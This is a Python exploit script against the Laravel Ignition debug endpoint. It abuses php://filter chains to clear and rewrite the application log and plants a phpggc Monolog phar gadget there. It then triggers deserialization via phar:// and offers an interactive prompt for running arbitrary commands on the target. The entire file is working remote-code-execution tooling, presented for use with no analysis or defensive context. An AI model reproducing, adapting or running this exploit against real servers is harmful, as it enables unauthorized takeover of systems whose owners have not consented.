'''
* Created by : MoonBack
* Date: 2021-01-15
* Github: https://github.com/M00nBack
'''
import requests
import os
import uuid
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def send_payload(url,viewFile):
    burp0_url = url + '/_ignition/execute-solution'
    try:
        burp0_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
            "Accept": "application/json", 
            "Accept-Encoding": "gzip, deflate", 
            "Content-Type": "application/json", 
            "Connection": "close"}
        burp0_json = {
                        "parameters": 
                            {
                                "variableName": "username", 
                                "viewFile": viewFile
                            },
                        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"
                     }
        
        brup0_r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
        return brup0_r.text

    except Exception as e:
        return None

def clear_log(url,log_path):
    payload1 = 'php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource='+ log_path
    # payload2 = 'php://filter/write=convert.base64-decode/resource='+ log_path
    flag = 0
    req_num = 0
    while True:
        req_content = send_payload(url,payload1)
        req_num+=1
        print("[*] clearing log use mixed filter!")
        if req_content!=None and len(req_content)==0:
            flag +=1
        if flag>=5:
            print('[+] clear log success !')
            return 1
        elif req_num >10:
            print('[!] clear log failed !')
            return 0

def generate_phar_tolog(url,encode_phar,log_path):
    send_payload(url,encode_phar)
    payload = 'php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource='+log_path
    req_content = send_payload(url,payload)
    if len(req_content)==0:
        print('[+] generate phar look like normal!')
    else:
        print('[!] generate phar is wrong!')

def phar_unerialize_res(url,log_path):
    payload= 'phar://'+ log_path
    res = send_payload(url,payload)
    return res

def phpggc_encode_phar(func,args):
    cmd = "php -d 'phar.readonly=0' ./phpggc Monolog/RCE1 '{}' '{}' --phar phar -o php://output | base64 -w0".format(func,args)
    print(cmd)
    cmd_res = os.popen(cmd,'r').read()
    print(cmd_res)
    res = ''.join(["=" + hex(ord(i))[2:] + "=00" for i in cmd_res]).upper()
    return "=00"+res

def check_vlun(url,log_path):
    id = str(uuid.uuid1())
    encode_phar = phpggc_encode_phar('var_dump',id)
    if clear_log(url,log_path)==1:
        generate_phar_tolog(url,encode_phar,log_path)
        res = phar_unerialize_res(url,log_path)
        if id in res:
            print('[+] target look like vlun!')
        else:
            print('[!] not found flag in response! this pop chain seem unuseful!')
            exit(1)
    else:
        exit(1)


def exploit_rce(url,log_path,cmd):
    id = str(uuid.uuid1())
    rce_cmd = 'echo {} ; {} ; echo {};'.format(id,cmd,id)
    encode_phar = phpggc_encode_phar('system',rce_cmd)
    if clear_log(url,log_path)==1:
        generate_phar_tolog(url,encode_phar,log_path)
        res = phar_unerialize_res(url,log_path)
        if id in res:
            mat = res.split(id)[1]
            if mat!=None:
                print('command result : \n--------------------------'+mat+'--------------------------')
        else:
            print(res)
    else:
        exit(1)

url = sys.argv[1]
log_path = '../storage/logs/laravel.log'
check_vlun(url,log_path)
while 1:
    cmd = input('input command: ')
    exploit_rce(url,log_path,cmd)